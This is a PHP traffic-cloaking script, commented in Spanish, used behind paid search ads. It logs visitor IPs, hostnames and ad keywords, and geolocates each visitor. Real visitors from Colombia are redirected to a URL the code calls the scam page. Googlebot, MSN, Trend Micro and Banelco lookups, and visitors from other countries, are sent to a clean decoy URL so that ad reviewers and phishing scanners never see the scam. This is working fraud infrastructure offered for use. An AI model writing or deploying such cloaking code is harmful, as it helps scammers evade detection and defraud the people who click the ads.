<?php

$urlscam = ""; //url de el scam

$urlreal = ""; //url que se coloca en adwords

$nacionalidad = "CO";
$referer  = ($_SERVER["HTTP_REFERER"] == "") ? "<br>NADA" : $_SERVER["HTTP_REFERER"];
define("NAVEGADOR", $_SERVER["HTTP_USER_AGENT"]);//nombre de el navegador
define("GOOGLEBOT", strpos($_SERVER["HTTP_USER_AGENT"],"Googlebot"));//control de googlebot
define("MSNBOT", strpos($_SERVER["HTTP_USER_AGENT"],"msn"));//control de msnbot
define("REFERER",$referer);//referer enviado desde la pagina
define("URLSCAM",$urlscam);//url de el scam
define("URLBOT",$urlreal);//url que se coloco para el trafico
$Hora= date('H:i:s');
$ip = $_SERVER["REMOTE_ADDR"];

@$palabraclave = $_REQUEST["keyword"];//la palabra clave que activo el anuncio
@$matchtype = $_REQUEST["matchtype"];//e = concordancia exacta, p = concordancia frase, b = concordancia amplia			  
@$network = $_REQUEST["network"];//g = Busqueda de Google, s = Asociado de Busqueda, c = Red de Display		
@$device = $_REQUEST["device"];//m = Celulares, t = tablets, c = Es un PC	
@$devicemodel = $_REQUEST["devicemodel"];//modelo de quien se conecto
@$placement = $_REQUEST["placement"]; //indica desde donde se dio clic
@$adposition = $_REQUEST["adposition"];//indica la pocision donde aparecio el anuncio
@$target = $_REQUEST["target"];
@$creative = $_REQUEST["creative"];
$hostname=gethostbyaddr($_SERVER["REMOTE_ADDR"]);
$archivodebug = "diezestadisticas.html";

if(!function_exists('curl_exec'))
{
	$contenido = file_get_contents("http://ip-api.com/json/".$_SERVER["REMOTE_ADDR"]);
}else{
	
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/".$ip);
	curl_setopt($ch, CURLOPT_USERAGENT, $navegador);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_VERBOSE, true);
	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$contenido = curl_exec($ch);
	curl_close($ch);
	
}




$resultado = explode('","',$contenido);	
$countrycode = $resultado[3];
$countryfull = explode('":"',$countrycode);


//TERMINA ZZONA VARIABLES



	if($matchtype == "e"){$tipoconcordancia = "Palabra Exacta";}else if($matchtype == "b"){$tipoconcordancia = "Palabra Amplia";}else if($matchtype == "b"){$tipoconcordancia = "Palabra De Frase";}else{$tipoconcordancia = $matchtype;}
	if($network == "g"){$tipodered = "Busqueda de Google";}else if($network == "s"){$tipodered = "Asociado de Busqueda";}else if($network == "c"){$tipodered = "Red de Busqueda Display";}else{$tipodered = $network;}
	if($device == "m"){$tipodispositivo = "Es un Celular!!";}else if($device == "t"){$tipodispositivo = "Es una Tablet!!";}else if($device == "c"){$tipodispositivo = "Es una PC!!";}else{$tipodispositivo = $network;}
	$dispositivomodelo = $devicemodel;
	$clicreferer = $placement;
	$targe1 = $target;
	$creative1 = $creative;
	if($adposition == "1t2"){$posicionanuncio = "Primera Pagina, Segunda Pocision";}else if($adposition == "1t1"){$pocisionanuncio = "Primera Pagina, Primera Pocision";}else if($adposition == "2t2"){	$pocisionanuncio = "Segunda Pagina, Segunda Pocision";}else if($adposition == "2t1"){$pocisionanuncio = "Segunda Pagina, Primera Pocision";}else{$pocisionanuncio = $adposition;}
	
	
	$todook = "<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>TODO OK!!!";
	$todook .= ($creative1 == "") ? "" : "<br>ID ANUNCIO: ANUNCIO-ID-".$creative1;
	$todook .=($ip == "") ? "" : "<br>IP: ".$ip;
	$todook .=($Hora == "") ? "" : " ---    HORA:".$Hora;
	$todook .=($palabraclave == "") ? ""	:  "<br><b>PALABRA CLAVE:".@$palabraclave."</b>";
	$todook .=($tipoconcordancia == "") ? "" : "<br>TIPO DE CONCORDANCIA:".@$tipoconcordancia;	  
	$todook .=($tipodered == "") ? "" : "<br>TIPO DE RED:".@$tipodered;	  
	$todook .=($tipodispositivo == "") ? "" : "<br>TIPO DE DISPOSITIVO:".@$tipodispositivo;  
	$todook .=($pocisionanuncio == "") ? "" : "<br>POCISION DEL ANUNCIO:".@$pocisionanuncio;
	$todook .=(REFERER  == "") ? "" : "<br>REFERER: ".REFERER;
	$todook .=(URLSCAM == "") ? "<br>NO CONTIENE URLBOT" : "nURL DESTINO:".URLSCAM;	
	$todook .=($target == "") ? "" : "<br>TARGET:".$target;			  
	$todook .=($hostname == "") ? "" : "<br>HOSTNAME:".@$hostname; 
	$todook .=	"<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br><br>";
			  
	$navegadoresunbot = "<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>EL NAVEGADOR ES UN BOT!!!";
	$navegadoresunbot .= ($creative1 == "") ? "" : "<br>ID ANUNCIO: ANUNCIO-ID-".$creative1;
	$navegadoresunbot .= ($ip == "") ? "" : "<br>IP: ".$ip;
	$navegadoresunbot .= ($Hora == "") ? "" : " ---    HORA:".$Hora;
	$navegadoresunbot .= ($palabraclave == "") ? ""	:  "<br><b>PALABRA CLAVE:".@$palabraclave."</b>";
	$navegadoresunbot .= ($tipoconcordancia == "") ? "" : "<br>TIPO DE CONCORDANCIA:".@$tipoconcordancia;		  
	$navegadoresunbot .= ($tipodered == "") ? "" : "<br>TIPO DE RED:".@$tipodered;
	$navegadoresunbot .= ($tipodispositivo == "") ? "" : "<br>TIPO DE DISPOSITIVO:".@$tipodispositivo; 		  
	$navegadoresunbot .= ($pocisionanuncio == "") ? "" : "<br>POCISION DEL ANUNCIO:".@$pocisionanuncio;
	$navegadoresunbot .= (REFERER  == "") ? "" : "<br>REFERER: ".REFERER;  
	$navegadoresunbot .= (URLBOT == "") ? "<br>NO CONTIENE URLBOT" : "<br>URL DESTINO:".URLBOT;
	$navegadoresunbot .= ($target == "") ? "" : "<br>TARGET:".$target;			  
	$navegadoresunbot .= ($hostname == "") ? "" : "<br>HOSTNAME:".@$hostname; 
	$navegadoresunbot .= "<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br><br>";
	
	
						
	$conectagoogle = "<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>SE CONECTA DESDE GOOGLE!!!";
	$conectagoogle .= ($creative1 == "") ? "" : "<br>ID ANUNCIO: ANUNCIO-ID-".$creative1;
	$conectagoogle .=($ip == "") ? "" : "<br>IP: ".$ip;
	$conectagoogle .=($Hora == "") ? "" : " ---    HORA:".$Hora;
	$conectagoogle .=($palabraclave == "") ? ""	:  "<br><b>PALABRA CLAVE:".@$palabraclave."</b>";
	$conectagoogle .=($tipoconcordancia == "") ? "" : "<br>TIPO DE CONCORDANCIA:".@$tipoconcordancia; 		  
	$conectagoogle .=($tipodered == "") ? "" : "<br>TIPO DE RED:".@$tipodered;
	$conectagoogle .=($tipodispositivo == "") ? "" : "<br>TIPO DE DISPOSITIVO:".@$tipodispositivo;		  
	$conectagoogle .=($pocisionanuncio == "") ? "" : "<br>POCISION DEL ANUNCIO:".@$pocisionanuncio;
	$conectagoogle .=(REFERER  == "") ? "" : "<br>REFERER: ".REFERER;
    $conectagoogle .=(URLBOT  == "") ? "<br>NO CONTIENE URLBOT" : "<br>URL DESTINO:".URLBOT;	
	$conectagoogle .=($target == "") ? "" : "<br>TARGET:".$target;			  
	$conectagoogle .=($hostname == "") ? "" : "<br>HOSTNAME:".@$hostname; 
	$conectagoogle .="<br>-------------------------------------------------------------------------------------<br><br>";
	
			 
	$noesnacionalidad = "<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>NO ES DE LA NACIONALIDAD SELECCIONADA ".@$nacionalidad."!!!";
	$noesnacionalidad .=   ($creative1 == "") ? "" : "<br>ID ANUNCIO: ANUNCIO-ID-".$creative1;
	$noesnacionalidad .= 	($ip == "") ? "" : "<br>IP: ".$ip;
	$noesnacionalidad .= ($Hora == "") ? "" : " ---    HORA:".$Hora;
	$noesnacionalidad .= ($palabraclave == "") ? ""	:  "<br><b>PALABRA CLAVE:".@$palabraclave."</b>";
	$noesnacionalidad .= ($tipoconcordancia == "") ? "" : "<br>TIPO DE CONCORDANCIA:".@$tipoconcordancia;		  
	$noesnacionalidad .= ($tipodered == "") ? "" : "<br>TIPO DE RED:".@$tipodered; 		  
	$noesnacionalidad .= ($tipodispositivo == "") ? "" : "<br>TIPO DE DISPOSITIVO:".@$tipodispositivo; 		  
	$noesnacionalidad .= ($pocisionanuncio == "") ? "" : "<br>POCISION DEL ANUNCIO:".@$pocisionanuncio;
	$noesnacionalidad .= (REFERER  == "") ? "" : "<br>REFERER: ".REFERER;
    $noesnacionalidad .= (URLBOT  == "") ? "<br>NO CONTIENE URLBOT" : "<br>URL DESTINO:".URLBOT;	
	$noesnacionalidad .= ($target == "") ? "" : "<br>TARGET:".$target;			  
	$noesnacionalidad .=  ($hostname == "") ? "" : "<br>HOSTNAME:".@$hostname; 
	$noesnacionalidad .= 	"<br>--------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>";
	


	if((GOOGLEBOT!==false) || (MSNBOT!==false)){//se comprueba primero el navegador
	
		if(file_exists($archivodebug)){
		
				$debug = fopen($archivodebug,"a+");
				fwrite($debug, $navegadoresunbot);
				fclose($debug);
				// header("HTTP/1.1 301 Moved Permanently");
				//header("Location: ".URLBOT);
			//	print "<html><head></head><body><script>document.location='".URLBOT."';</script></body></html>";
		}else{
					
				$debug = fopen($archivodebug,"a+");
				fwrite($debug, "<center><h1>NO LO DEJES LLENAR MUCHO ^.^ PARCERO!!!!!</h1></center><br><br>".$navegadoresunbot);
				fclose($debug);
					
				}
	}else{

		
		//print_r($countryfull);
		
		if($countryfull[1] == $nacionalidad){
		
				$dns=gethostbyaddr($ip);
				$googlebot=strpos($dns,"google");
				$reportphishing = strpos($dns, "trendmicro");
				$msn = strpos($dns, "msn");
				$banelco = strpos($dns, "banelco");
			//print "es una persona";
				 if(($googlebot!==false) || ($reportphishing!==false) || ($msn!==false) || ($banelco!==false)) //si el nombre de dominio dice googlebot o  google es un robot
				{ 
					$visitante = "robot";
				}else{
				
					$visitante = "persona";
				}
				
			
			if($visitante == "persona"){
				
				
				if(file_exists($archivodebug)){
						$debug = fopen($archivodebug,"a+");
						fwrite($debug, $todook);
						fclose($debug);				
				}else{
					
						$debug = fopen($archivodebug,"a+");
						fwrite($debug, "<center><h1>Que me ves negro??? -.-</h1></center><br><br>".$todook);
						fclose($debug);
					
				}
				
				
				//header("HTTP/1.1 301 Moved Permanently");
				//header("Location: ".URLSCAM);
				 print "<html><head></head><body><script>document.location='".URLSCAM."';</script></body></html>";
				//print "es persona";
			}else{
				
					if(file_exists($archivodebug)){
						$debug = fopen($archivodebug,"a+");
						fwrite($debug, $conectagoogle);
						fclose($debug);
						//header("HTTP/1.1 301 Moved Permanently");
						//header("Location: ".URLBOT);                               
		
					 
				  }else{
					
						$debug = fopen($archivodebug,"a+");
						fwrite($debug, "<center><h2>NO LO DEJES LLENAR MUCHO ^.^ PARCERO!!!!!</h2></center><br><br>".$conectagoogle);
						fclose($debug);
					
				}
				
				 print "<html><head></head><body><script>document.location='".URLBOT."';</script></body></html>";
				//  print "es un robot";
			}
		
		}else{
			
				if(file_exists($archivodebug)){
					$debug = fopen($archivodebug,"a+");
					fwrite($debug, $noesnacionalidad);
					fclose($debug);
				}else{
					
						$debug = fopen($archivodebug,"a+");
						fwrite($debug, "<center><h1>NO LO DEJES LLENAR MUCHO ^.^ PARCERO!!!!!</h1></center><br><br>".$noesnacionalidad);
						fclose($debug);
					
				}
					//print "no es de nacionalidad  ".$nacionalidad;
					//header("HTTP/1.1 301 Moved Permanently");
					//header("Location: ".URLBOT);   
                    print "<html><head></head><body><script>document.location='".URLBOT."';</script></body></html>";
		//
		}

		

	}
    ?>
